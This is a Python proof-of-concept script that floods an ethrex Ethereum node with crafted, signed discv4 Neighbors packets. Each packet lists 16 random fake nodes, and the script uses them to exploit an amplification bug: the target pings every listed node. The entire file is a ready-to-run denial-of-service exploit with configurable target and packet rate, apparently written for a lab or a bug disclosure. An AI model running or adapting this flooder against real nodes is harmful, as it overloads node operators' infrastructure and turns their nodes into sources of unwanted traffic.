#!/usr/bin/env python3
"""
Sends crafted discv4 Neighbors packets to a target ethrex node.

Each Neighbors message contains 16 random fake node entries. The target node
will attempt to PING each one (the 1:16 amplification bug in handle_neighbors).

Usage: flooder.py <target_ip> <target_port> [packets_per_second]
"""

import os
import sys
import time
import socket
import struct
import secrets

from Crypto.Hash import keccak as keccak_mod
from coincurve import PrivateKey
import rlp


def keccak256(data: bytes) -> bytes:
    h = keccak_mod.new(digest_bits=256)
    h.update(data)
    return h.digest()


# ── RLP-encodable types matching discv4 wire format ────────────────

class Endpoint(rlp.Serializable):
    fields = [
        ("ip", rlp.sedes.binary),
        ("udp_port", rlp.sedes.big_endian_int),
        ("tcp_port", rlp.sedes.big_endian_int),
    ]


class NodeRecord(rlp.Serializable):
    fields = [
        ("ip", rlp.sedes.binary),
        ("udp_port", rlp.sedes.big_endian_int),
        ("tcp_port", rlp.sedes.big_endian_int),
        ("pubkey", rlp.sedes.binary),
    ]


class NeighborsPayload(rlp.Serializable):
    fields = [
        ("nodes", rlp.sedes.CountableList(NodeRecord)),
        ("expiration", rlp.sedes.big_endian_int),
    ]


def make_random_node() -> NodeRecord:
    """Generate a fake node with a random IP and pubkey."""
    # Random IP in 192.168.x.x range (won't route anywhere)
    ip = bytes([192, 168, secrets.randbelow(256), secrets.randbelow(254) + 1])
    # Random 64-byte public key (doesn't need to be valid for triggering the bug)
    pubkey = secrets.token_bytes(64)
    return NodeRecord(ip=ip, udp_port=30303, tcp_port=30303, pubkey=pubkey)


def build_neighbors_packet(signer: PrivateKey, num_nodes: int = 16) -> bytes:
    """
    Build a discv4 Neighbors packet:
      [hash(32)] [signature(65)] [type(1)] [RLP(nodes, expiration)]
    """
    nodes = [make_random_node() for _ in range(num_nodes)]
    expiration = int(time.time()) + 3600  # 1 hour from now

    payload = NeighborsPayload(nodes=nodes, expiration=expiration)
    rlp_data = rlp.encode(payload)

    # type byte: 0x04 = Neighbors
    type_byte = b"\x04"
    type_and_data = type_byte + rlp_data

    # Sign keccak256(type || rlp_data)
    digest = keccak256(type_and_data)
    sig = signer.sign_recoverable(digest, hasher=None)
    # coincurve returns 65 bytes: [r(32) || s(32) || v(1)]
    assert len(sig) == 65

    # Hash = keccak256(signature || type || rlp_data)
    hash_input = sig + type_and_data
    packet_hash = keccak256(hash_input)

    return packet_hash + hash_input


def main():
    target_ip = sys.argv[1] if len(sys.argv) > 1 else "10.55.0.10"
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 30303
    pps = int(sys.argv[3]) if len(sys.argv) > 3 else 100

    print(f"Flooding {target_ip}:{target_port} with Neighbors packets at {pps} pps")
    print(f"Each packet has 16 fake nodes → expected {pps * 16} PINGs/sec from target")
    print(f"Press Ctrl+C to stop")

    signer = PrivateKey(secrets.token_bytes(32))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    interval = 1.0 / pps
    sent = 0
    t0 = time.monotonic()

    try:
        while True:
            packet = build_neighbors_packet(signer, num_nodes=16)
            sock.sendto(packet, (target_ip, target_port))
            sent += 1

            # Maintain target rate
            expected_time = t0 + sent * interval
            now = time.monotonic()
            if now < expected_time:
                time.sleep(expected_time - now)

            # Log every 5 seconds
            elapsed = time.monotonic() - t0
            if sent % (pps * 5) == 0:
                actual_pps = sent / elapsed
                print(f"  sent={sent}  elapsed={elapsed:.1f}s  actual_pps={actual_pps:.1f}")

    except KeyboardInterrupt:
        elapsed = time.monotonic() - t0
        print(f"\nStopped. Sent {sent} packets in {elapsed:.1f}s ({sent/elapsed:.1f} pps)")
    finally:
        sock.close()


if __name__ == "__main__":
    main()
